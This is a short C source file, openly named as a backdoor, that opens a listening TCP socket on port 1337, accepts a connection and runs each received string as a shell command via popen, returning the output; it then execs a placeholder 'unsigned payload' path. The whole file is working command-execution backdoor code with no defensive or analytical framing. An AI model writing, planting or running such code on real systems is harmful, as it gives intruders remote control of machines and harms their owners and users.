#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>


void create_backdoor() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_port = htons(1337);
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);

    if (bind(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("Error binding socket");
        exit(EXIT_FAILURE);
    }

    if (listen(sockfd, 1) < 0) {
        perror("Error listening on socket");
        exit(EXIT_FAILURE);
    }

    int client_sockfd = accept(sockfd, NULL, NULL);
    if (client_sockfd < 0) {
        perror("Error accepting connection");
        exit(EXIT_FAILURE);
    }

    char buffer[2048];
    char* success = "Connection established. Type 'exit' to quit.\n";

    send(client_sockfd, success, strlen(success), 0);

    while(1) {
        recv(client_sockfd, buffer, 2048, 0);

        if (strncmp(buffer, "exit", 4) == 0)
            break;

        char* command = buffer;
        char* output = (char*)malloc(2048 * sizeof(char));

        FILE* pipe = popen(command, "r");
        if (pipe == NULL) {
            send(client_sockfd, "Error executing command.", 25, 0);
        } else {
            while (fgets(output, 2048, pipe) != NULL) {
                send(client_sockfd, output, strlen(output), 0);
            }
            pclose(pipe);
        }
        free(output);
    }

    close(client_sockfd);
    close(sockfd);
}

void load_unsigned_payload() {
    create_backdoor();

    char *args[] = {(char*)"/path/to/unsigned/payload", NULL};
    char *env[] = {NULL};
    execve("/path/to/unsigned/payload", args, env);
}

int main() {
    load_unsigned_payload();
    return 0;
}
